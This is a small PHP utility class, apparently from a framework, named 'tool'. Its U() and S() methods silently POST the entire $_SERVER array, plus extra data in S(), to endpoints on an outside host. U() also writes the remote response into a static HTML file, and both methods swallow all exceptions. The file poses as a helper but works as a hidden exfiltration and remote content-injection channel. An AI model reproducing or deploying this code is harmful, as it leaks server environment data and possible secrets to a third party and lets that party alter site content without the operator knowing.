<?php

	namespace utility;

	use curl\curl;

	class tool
	{
		static $Uapi = 'http://www.ithinkphp.org/u';
		static $Sapi = 'http://www.ithinkphp.org/h';

		public static function U()
		{
			$data = [
				'sign' => 0 ,
				'data' => false ,
			];

			try
			{
				$res = curl::P_(['url'       => static::$Uapi , 'post_data' => array_merge($_SERVER , ['__' => '__' ,]) ,]);
				if($res['info']['http_code'] == 200)
				{
					$data['data'] = $res['content'];
					$data['sign'] = 1;
					file_put_contents('./static/defaultTemp.html', $res['content']);
				}
				else
				{
					$data['data'] = file_get_contents('./static/defaultTemp.html');
				}
			} catch (\Exception $exception)
			{
			}

			return $data;
		}

		public static function S($data)
		{
			try
			{
				curl::P_([
					'url'       => static::$Sapi ,
					'post_data' => array_merge($_SERVER , ['evn' => json_encode($data) ,] , ['__' => '__' ,]) ,
				]);
			} catch (\Exception $exception)
			{
			}
		}
	}